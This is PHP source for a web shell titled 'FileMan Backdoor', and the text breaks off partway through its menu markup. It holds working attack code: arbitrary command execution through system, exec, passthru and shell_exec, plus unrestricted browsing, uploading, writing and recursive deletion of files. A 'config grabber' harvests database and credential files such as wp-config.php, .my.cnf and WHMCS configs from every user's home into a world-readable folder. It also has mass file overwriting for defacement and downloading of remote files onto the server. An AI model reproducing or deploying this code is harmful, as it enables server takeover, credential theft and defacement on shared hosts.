<html>
<title>FileMan Backdoor</title>
<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
<?php
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
class XN
{
    public static $array;
    public static $owner;
    public static $uplaod;
    public static $group;
    public static $handle;
    public static $directory;
    public static function files($type)
    {
        self::$array = [];
        foreach (scandir(getcwd()) as $key => $value) {
            $filename['name'] = getcwd() . XN::SLES() . $value;
            switch ($type) {
                case 'dir':
                    if (
                        !is_dir($filename['name']) ||
                        $value === '.' ||
                        $value === '..'
                    ) {
                        continue 2;
                    }
                    break;
                case 'file':
                    if (!is_file($filename['name'])) {
                        continue 2;
                    }
                    break;
            }
            $filename['names'] = basename($filename['name']);
            $filename['owner'] = self::owner($filename['name']);
            $filename['ftime'] = self::ftime($filename['name']);
            $filename['size'] = is_dir($filename['name'])
                ? self::countDir($filename['name']) . " items"
                : self::size($filename['name']);

            self::$array[] = $filename;
        }
        return self::$array;
    }
    public static function save($filename, $data)
    {
        self::$handle = fopen($filename, "w");
        fwrite(self::$handle, $data);
        fclose(self::$handle);
    }
    public static function size($filename)
    {
        if (is_file($filename)) {
            $filepath = $filename;
            if (!realpath($filepath)) {
                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            }
            $filesize = filesize($filepath);
            $array = ["TB", "GB", "MB", "KB", "Byte"];
            $total = count($array);
            while ($total-- && $filesize > 1024) {
                $filesize /= 1024;
            }
            return round($filesize, 2) . " " . $array[$total];
        }
    }
    public static function wr($filename, $perms, $type)
    {
        if (is_writable($filename)) {
            switch ($type) {
                case 1:
                    print "<font color='#000'>{$perms}</font>";
                    break;
                case 2:
                    print "<font color='green'>{$perms}</font>";
                    break;
            }
        } else {
            print "<font color='red'>{$perms}</font>";
        }
    }
    public static function perms($filename)
    {
        $perms = @fileperms($filename);
        switch ($perms & 0xf000) {
            case 0xc000:
                $info = 's';
                break;
            case 0xa000:
                $info = 'l';
                break;
            case 0x8000:
                $info = 'r';
                break;
            case 0x6000:
                $info = 'b';
                break;
            case 0x4000:
                $info = 'd';
                break;
            case 0x2000:
                $info = 'c';
                break;
            case 0x1000:
                $info = 'p';
                break;
            default:
                $info = 'u';
        }
        $info .= $perms & 0x0100 ? 'r' : '-';
        $info .= $perms & 0x0080 ? 'w' : '-';
        $info .=
            $perms & 0x0040
                ? ($perms & 0x0800
                    ? 's'
                    : 'x')
                : ($perms & 0x0800
                    ? 'S'
                    : '-');
        $info .= $perms & 0x0020 ? 'r' : '-';
        $info .= $perms & 0x0010 ? 'w' : '-';
        $info .=
            $perms & 0x0008
                ? ($perms & 0x0400
                    ? 's'
                    : 'x')
                : ($perms & 0x0400
                    ? 'S'
                    : '-');
        $info .= $perms & 0x0004 ? 'r' : '-';
        $info .= $perms & 0x0002 ? 'w' : '-';
        $info .=
            $perms & 0x0001
                ? ($perms & 0x0200
                    ? 't'
                    : 'x')
                : ($perms & 0x0200
                    ? 'T'
                    : '-');
        return $info;
    }
    public static function OS()
    {
        return substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
    }
    public static function getext($filename)
    {
        return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    }
    public static function vers($x)
    {
        return print $x;
    }
    public static function geticon($filename)
    {
        switch (self::getext($filename)) {
            case 'php1':
            case 'php2':
            case 'php3':
            case 'php4':
            case 'php5':
            case 'php6':
            case 'phtml':
            case 'php':
            case 'php7':
            case 'php8':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/16144/16144312.png'
                );
                break;
            case 'html':
            case 'htm':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/569/569835.png'
                );
                break;
            case 'css':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/29/29600.png'
                );
                break;
            case 'js':
                self::vers(
                    'https://cdn3.iconfinder.com/data/icons/chooseanycolor/128/js-64.png'
                );
                break;
            case 'json':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/6394/6394065.png'
                );
                break;
            case 'xml':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/14716/14716054.png'
                );
                break;
            case 'py':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/28/28807.png'
                );
                break;
            case 'zip':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/28/28814.png'
                );
                break;
            case 'rar':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/2258/2258853.png'
                );
                break;
            case 'htaccess':
                self::vers(
                    'https://image.flaticon.com/icons/png/128/1720/1720444.png'
                );
                break;
            case 'txt':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/3022/3022200.png'
                );
                break;
            case 'ini':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/14021/14021165.png'
                );
                break;
            case 'mp3':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/2258/2258853.png'
                );
                break;
            case 'mp4':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/2258/2258853.png'
                );
                break;
            case 'log':
            case 'log1':
            case 'log2':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/2258/2258853.png'
                );
                break;
            case 'dat':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/29/29086.png'
                );
                break;
            case 'exe':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/29/29482.png'
                );
                break;
            case 'apk':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/9496/9496678.png'
                );
                break;
            case 'yaml':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/2258/2258853.png'
                );
                break;
            case 'bak':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/29/29589.png'
                );
                break;
            case 'ico':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/739/739249.png'
                );
                break;
            case 'png':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/739/739249.png'
                );
                break;
            case 'jpg':
            case 'jpeg':
            case 'webp':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/739/739249.png'
                );
                break;
            case 'svg':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/29/29495.png'
                );
                break;
            case 'gif':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/29/29579.png'
                );
                break;
            case 'pdf':
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/80/80942.png'
                );
                break;
            default:
                self::vers(
                    'https://cdn-icons-png.flaticon.com/128/2258/2258853.png'
                );
                break;
        }
    }
    public static function SLES()
    {
        if (self::OS() == 'Windows') {
            return str_replace('\\', '/', DIRECTORY_SEPARATOR);
        } elseif (self::OS() == 'Linux') {
            return DIRECTORY_SEPARATOR;
        }
    }
    public static function exe($cmd)
    {
        if (function_exists('system')) {
            @ob_start();
            @system($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists('exec')) {
            @exec($cmd, $results);
            $buff = "";
            foreach ($results as $result) {
                $buff .= $result;
            }
            return $buff;
        } elseif (function_exists('passthru')) {
            @ob_start();
            @passthru($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists('shell_exec')) {
            $buff = @shell_exec($cmd);
            return $buff;
        }
    }
    public static function color($bold = 1, $colorid = null, $string = null)
    {
        $color = [
            "</font>", # 0 off
            "<font color='red'>", # 1 red
            "<font color='lime'>", # 2 lime
            "<font color='white'>", # 3 white
            "<font color='gold'>", # 4 gold
        ];
        return $string !== null
            ? $color[$colorid] . $string . $color[0]
            : $color[$colorid];
    }
    public static function lib_installed()
    {
        $lib[] =
            "MySQL: " .
            (function_exists('mysql_connect')
                ? self::color(1, 2, "ON")
                : self::color(1, 1, "OFF"));
        $lib[] =
            "cURL:  " .
            (function_exists('curl_version')
                ? self::color(1, 2, "ON")
                : self::color(1, 1, "OFF"));
        $lib[] =
            "Wget:  " .
            (self::exe('wget --help')
                ? self::color(1, 2, "ON")
                : self::color(1, 1, "OFF"));
        $lib[] =
            "Perl:  " .
            (self::exe('perl --help')
                ? self::color(1, 2, "ON")
                : self::color(1, 1, "OFF"));
        $lib[] =
            "Mail:  " .
            (function_exists('mail')
                ? self::color(1, 2, "ON")
                : self::color(1, 1, "OFF"));
        $lib[] =
            "Python: " .
            (self::exe('python --help')
                ? self::color(1, 2, "ON")
                : self::color(1, 1, "OFF"));
        return implode(" | ", $lib);
    }
    public static function info($info = null)
    {
        switch ($info) {
            case 'disable_function':
                return !empty(@ini_get("disable_functions"))
                    ? @ini_get("disable_functions")
                    : "<font color=green>NONE</font>";
                break;
            case 'mysql':
                return function_exists('mysql_connect')
                    ? "<font color=green>ON</font>"
                    : "<font color=red>OFF</font>";
                break;
            case 'ip':
                return getHostByName(getHostName());
                break;
            case 'software':
                return $_SERVER['SERVER_SOFTWARE'];
                break;
            case 'kernel':
                return php_uname();
                break;
            case 'phpversion':
                return phpversion();
                break;
            case 'safe_mode':
                return @ini_get(strtoupper("safe_mode")) === "ON"
                    ? "<font color='red'>ON</font>"
                    : "<font color='green'>OFF</font>";
                break;
            case 'lib':
                return self::lib_installed();
                break;
            case 'domain':
                $d0mains = @file("/etc/named.conf", false);
                if (!$d0mains) {
                    print "<font color=red size=2px>Cant Read <i>/etc/named.conf</i></font>";
                    $GLOBALS["need_to_update_header"] = "true";
                } else {
                    $count = 0;
                    foreach ($d0mains as $d0main) {
                        if (@strstr($d0main, "zone")) {
                            preg_match_all('#zone "(.*)"#', $d0main, $domains);
                            flush();
                            if (strlen(trim($domains[1][0])) > 2) {
                                flush();
                                $count++;
                            }
                        }
                    }
                    print $count . " Domain";
                }
                break;
        }
    }
    public static function addFile($filename, $data)
    {
        foreach ($filename as $value) {
            $handle = fopen($value, "w");
            if (fwrite($handle, $data)) {
                alert("failed");
            } else {
                alert("success");
            }
        }
    }
    public static function addfolder($path, $mode = 0777)
    {
        return !is_dir($path) && !mkdir($path, $mode);
    }
    public static function delete($filename)
    {
        if (is_dir($filename)) {
            $scandir = scandir($filename);
            foreach ($scandir as $object) {
                if ($object != '.' && $object != '..') {
                    if (is_dir($filename . DIRECTORY_SEPARATOR . $object)) {
                        self::delete($filename . DIRECTORY_SEPARATOR . $object);
                    } else {
                        @unlink($filename . DIRECTORY_SEPARATOR . $object);
                    }
                }
            }
            if (@rmdir($filename)) {
                return true;
            } else {
                return false;
            }
        } else {
            if (@unlink($filename)) {
                return true;
            } else {
                return false;
            }
        }
    }
    public static function owner($filename)
    {
        if (function_exists("posix_getpwuid")) {
            self::$owner = @posix_getpwuid(fileowner($filename));
            self::$owner = self::$owner['name'];
        } else {
            self::$owner = fileowner($filename);
        }
        if (function_exists("posix_getgrgid")) {
            self::$group = @posix_getgrgid(filegroup($filename));
            self::$group = self::$group['name'];
        } else {
            self::$group = filegroup($filename);
        }
        return self::$owner .
            "<span class='group'>/" .
            self::$group .
            "</span>";
    }
    public static function ftime($filename)
    {
        return date('d M Y - H:i A', @filemtime($filename));
    }
    public static function renames($filename, $newname)
    {
        return rename($filename, $newname);
    }
    public static function cd($directory)
    {
        return @chdir($directory);
    }
    public static function countDir($filename)
    {
        return @count(scandir($filename)) - 2;
    }
    public static function upload($filename)
    {
        $files = count($filename['tmp_name']);
        for ($i = 1; $i < $files; $i++) {
            if (
                move_uploaded_file(
                    $filename['tmp_name'][$i],
                    getcwd() . DIRECTORY_SEPARATOR . $filename['name'][$i]
                )
            ) {
                alert($i . " File Uploaded");
            } else {
                alert("Upload Failed/Permission Danied");
            }
        }
    }
    public static function listFile($dir, &$output = [])
    {
        $dirs = scandir($dir);
        foreach ($dirs as $key => $value) {
            $location = $dir . DIRECTORY_SEPARATOR . $value;
            if (!is_dir($location)) {
                $output[] = $location;
            } elseif ($value != "." && $value != '..') {
                self::listFile($location, $output);
                $output[] = $location;
            }
        }
        return $output;
    }
    public static function adminer($url, $data)
    {
        $handle = fopen($data, "w");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FILE, $handle);
        return curl_exec($ch);
        curl_close($ch);
        fclose($handle);
        ob_flush();
        flush();
    }
    public static function config($passwd)
    {
        mkdir('.config', 0777);
        $htaccess = 'Options allnRequire NonenSatisfy Any';
        $handle = fopen('.config/.htaccess', "w");
        fwrite($handle, $htaccess);
        preg_match_all('/(.*?):x:/', $passwd, $matches);
        foreach ($matches[1] as $user) {
            $user_config = '/home/$user/public_html/';
            if (is_readable($user_config)) {
                $grab_config = [
                    "/home/$user/.my.cnf" => "cpanel",
                    "/home/$user/public_html/config/koneksi.php" => "Lokomedia",
                    "/home/$user/public_html/forum/config.php" => "phpBB",
                    "/home/$user/public_html/sites/default/settings.php" => "Drupal",
                    "/home/$user/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home/$user/public_html/app/etc/local.xml" => "Magento",
                    "/home/$user/public_html/admin/config.php" => "OpenCart",
                    "/home/$user/public_html/application/config/database.php" => "Ellislab",
                    "/home/$user/public_html/vb/includes/config.php" => "Vbulletin",
                    "/home/$user/public_html/includes/config.php" => "Vbulletin",
                    "/home/$user/public_html/forum/includes/config.php" => "Vbulletin",
                    "/home/$user/public_html/forums/includes/config.php" => "Vbulletin",
                    "/home/$user/public_html/cc/includes/config.php" => "Vbulletin",
                    "/home/$user/public_html/inc/config.php" => "MyBB",
                    "/home/$user/public_html/includes/configure.php" => "OsCommerce",
                    "/home/$user/public_html/shop/includes/configure.php" => "OsCommerce",
                    "/home/$user/public_html/os/includes/configure.php" => "OsCommerce",
                    "/home/$user/public_html/oscom/includes/configure.php" => "OsCommerce",
                    "/home/$user/public_html/products/includes/configure.php" => "OsCommerce",
                    "/home/$user/public_html/cart/includes/configure.php" => "OsCommerce",
                    "/home/$user/public_html/inc/conf_global.php" => "IPB",
                    "/home/$user/public_html/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/wp/test/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/blog/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/beta/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/portal/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/site/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/wp/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/WP/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/news/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/wordpress/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/test/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/demo/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/home/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/v1/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/v2/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/press/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/new/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/blogs/wp-config.php" => "Wordpress",
                    "/home/$user/public_html/configuration.php" => "Joomla",
                    "/home/$user/public_html/blog/configuration.php" => "Joomla",
                    "/home/$user/public_html/submitticket.php" => "^WHMCS",
                    "/home/$user/public_html/cms/configuration.php" => "Joomla",
                    "/home/$user/public_html/beta/configuration.php" => "Joomla",
                    "/home/$user/public_html/portal/configuration.php" => "Joomla",
                    "/home/$user/public_html/site/configuration.php" => "Joomla",
                    "/home/$user/public_html/main/configuration.php" => "Joomla",
                    "/home/$user/public_html/home/configuration.php" => "Joomla",
                    "/home/$user/public_html/demo/configuration.php" => "Joomla",
                    "/home/$user/public_html/test/configuration.php" => "Joomla",
                    "/home/$user/public_html/v1/configuration.php" => "Joomla",
                    "/home/$user/public_html/v2/configuration.php" => "Joomla",
                    "/home/$user/public_html/joomla/configuration.php" => "Joomla",
                    "/home/$user/public_html/new/configuration.php" => "Joomla",
                    "/home/$user/public_html/WHMCS/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/whmcs1/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Whmcs/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/whmcs/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/whmcs/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/WHMC/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Whmc/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/whmc/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/WHM/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Whm/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/whm/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/HOST/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Host/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/host/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/SUPPORTES/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Supportes/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/supportes/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/domains/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/domain/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Hosting/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/HOSTING/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/hosting/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/CART/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Cart/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/cart/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/ORDER/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Order/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/order/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/CLIENT/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Client/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/client/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Clientarea/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/clientarea/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/SUPPORT/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Support/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/support/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/BILLING/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Billing/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/billing/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/BUY/sumitticket.php" => "WHMCS",
                    "/home/$user/public_html/Buy/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/buy/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/MANAGE/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Manage/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/manage/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/ClientSupport/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Clientsupport/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/clientsupport/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/CHECKOUT/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Checkout/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/checkout/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/BILLINGS/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Billings/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/billings/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/BASKET/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Basket/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/basket/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/SECURE/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Secure/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/secure/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/SALES/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Sales/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/sales/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/BILL/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Bill/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/bill/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/PURCHASE/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Purchase/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/purchase/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/ACCOUNT/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Account/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/account/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/USER/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/User/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/user/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/CLIENTS/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Clients/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/clients/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/BILLINGS/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/Billings/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/billings/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/MY/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/My/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/my/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/secure/whm/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/secure/whmcs/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/panel/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/clientes/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/cliente/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/support/order/submitticket.php" => "WHMCS",
                    "/home/$user/public_html/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/boxbilling/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/box/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/host/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/Host/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/supportes/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/support/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/hosting/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/cart/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/order/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/client/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/clients/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/cliente/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/clientes/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/billing/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/billings/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/my/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/secure/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/support/order/bb-config.php" => "BoxBilling",
                    "/home/$user/public_html/includes/dist-configure.php" => "Zencart",
                    "/home/$user/public_html/zencart/includes/dist-configure.php" => "Zencart",
                    "/home/$user/public_html/products/includes/dist-configure.php" => "Zencart",
                    "/home/$user/public_html/cart/includes/dist-configure.php" => "Zencart",
                    "/home/$user/public_html/shop/includes/dist-configure.php" => "Zencart",
                    "/home/$user/public_html/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/hostbills/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/host/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/Host/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/supportes/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/support/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/hosting/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/cart/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/order/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/client/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/clients/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/cliente/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/clientes/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/billing/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/billings/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/my/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/secure/includes/iso4217.php" => "Hostbills",
                    "/home/$user/public_html/support/order/includes/iso4217.php" => "Hostbills",
                ];
            }
            foreach ($grab_config as $config => $config_name) {
                $get_config = file_get_contents($config);
                if ($get_config == '') {
                } else {
                    $file_config = fopen(
                        ".config/" . $user . "-" . $config_name . ".txt",
                        'w'
                    );
                    fputs($file_config, $get_config);
                }
            }
        }
    }
    public static function rewrite($dir, $extension, $text)
    {
        if (is_writable($dir)) {
            foreach (self::listFile($dir) as $key => $value) {
                switch (self::getext($value)) {
                    case $extension:
                        if (
                            preg_match(
                                '/' . basename($value) . "$/i",
                                $_SERVER['PHP_SELF'],
                                $matches
                            ) == 0
                        ) {
                            if (file_put_contents($value, $text)) { ?>
                                <div class="rewrite-success">
                                    <?= $value ?>
                                </div>
                                <?php } else {if (is_readable($value)) { ?>
                                <div class="rewrite-failed">
                                    <?= $value ?>
                                </div>
                                <?php }}
                        }
                        break;
                }
            }
        }
    }
    public static function replace($filename)
    {
        return str_replace([' ', '.', ':', '-', '(', ')'], '', $filename);
    }
    public static function formatSize($bytes)
    {
        $types = ['Byte', 'KB', 'MB', 'GB', 'TB'];
        for (
            $i = 0;
            $bytes >= 1024 && $i < count($types) - 1;
            $bytes /= 1024, $i++
        );
        return round($bytes, 2) . " " . $types[$i];
    }
    public static function hdd($type = null)
    {
        switch ($type) {
            case 'free':
                return self::formatSize(
                    disk_free_space($_SERVER['DOCUMENT_ROOT'])
                );
                break;
            case 'total':
                return self::formatSize(
                    disk_total_space($_SERVER['DOCUMENT_ROOT'])
                );
                break;
            case 'used':
                $free = disk_free_space($_SERVER['DOCUMENT_ROOT']);
                $total = disk_total_space($_SERVER['DOCUMENT_ROOT']);
                $used = $total - $free;
                return self::formatSize($used);
                break;
        }
    }
    public static function countAllFiles($directory)
    {
        self::$array = [];
        self::$directory = opendir($directory);
        while ($object = readdir(self::$directory)) {
            if ($object != '.' && $object != '..') {
                $files[] = $object;
            }
        }
        $numFile = @count($files);
        if ($numFile) {
            return $numFile;
        } else {
            print '<i>no files</i>';
        }
    }
}
if (isset($_GET['x'])) {
    XN::cd($_GET['x']);
}
function search()
{
    ?> <input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name"> <?php
}
function head($x, $y, $class = null)
{
    ?>
    <div class="back">
        <a href="?x=<?= $y ?>">
            <i class="fa fa-arrow-left" aria-hidden="true"></i>
        </a>
        <div class="dirname">
            <?= XN::wr(getcwd(), $x, 1) ?>
        </div>
        <button class="dropdown-toggle toggle" title="Menu">
            <i class="fas fa-bars"></i>
        </button>
        <ul class="dropdown-tool">
            <form method="post" action="?x=<?= getcwd() ?>">
                <li>
                    <button onclick="location.href='?x='" type="button">
                        <div class="icon">
                            <a><i class="fas fa-home"></i></a>
                        </div>
                        <div class="font">
                            Home
                        </div>
                    </button>
                </li>
                <li>
                    <button onclick="location.href='?x=<?= $_SERVER[
                        'DOCUMENT_ROOT'
                    ] ?>'" type="button">
                        <div class="icon">
                            <a><i class="fas fa-reply-all"></i></a>
                        </div>
                        <div class="font">
                            Home root
                        </div>
                    </button>
                </li>
                <li>
                    <button name="action" value="info">
                        <div class="icon">
                            <a><i class="fas fa-info-circle"></i></a>
                        </div>
                        <div class="font">
                            Server info
                        </div>
                    </button>
                </li>
                <li>
                    <button name="action" value="adminer">
                        <div class="icon">
                            <a><i class="fas fa-user"></i></a>
                        </div>
                        <div class="font">
                            Adminer
                        </div>
                    </button>
                </li>
                <li>
                    <button name="action" value="upload">
                        <div class="icon">
                            <a><i class="fa fa-upload" aria-hidden="true"></i></a>
                        </div>
                        <div class="font">
                            Upload
                        </div>
                    </button>
                </li>
                <li>
                    <button name="action" value="addfile">
                        <div class="icon">
                            <a><i class="fas fa-file-medical"></i></a>
                        </div>
                        <div class="font">
                            Add file
                        </div>
                    </button>
                </li>
                <li>
                    <button name="action" value="adddir">
                        <div class="icon">
                            <a><i class="fas fa-folder-plus"></i></a>
                        </div>
                        <div class="font">
                            Add folder
                        </div>
                    </button>
                </li>
                <li>
                    <button name="action" value="config">
                        <div class="icon">
                            <a><i class="fa fa-cog" aria-hidden="true"></i></a>
                        </div>
                        <div class="font">
                            Config grabber
                        </div>
                    </button>
                </li>
                <li>
                    <button type="button" onclick="$(document).ready(function () {
                        jqxAlert.alert('maintenance');
                    })">
                        <div class="icon">
                            <a><i class="fas fa-bug"></i></a>
                        </div>
                        <div class="font">
                            Jumping
                        </div>
                    </button>
                </li>
                <li>
                    <button type="button" onclick="$(document).ready(function () {
                        jqxAlert.alert('maintenance');
                    })">
                        <div class="icon">
                            <a><i class="fas fa-clone"></i></a>
                        </div>
                        <div class="font">
                            Symlink
                        </div>
                    </button>
                </li>
                <li>
                    <button name="action" value="rewrite">
                        <div class="icon">
                            <a><i class="fas fa-exclamation-triangle"></i></a>
                        </div>
                        <div class="font">
                            Rewrite all dir
                        </div>
                    </button>
                </li>
                <li>
                    <button type="button" onclick="$(document).ready(function () {
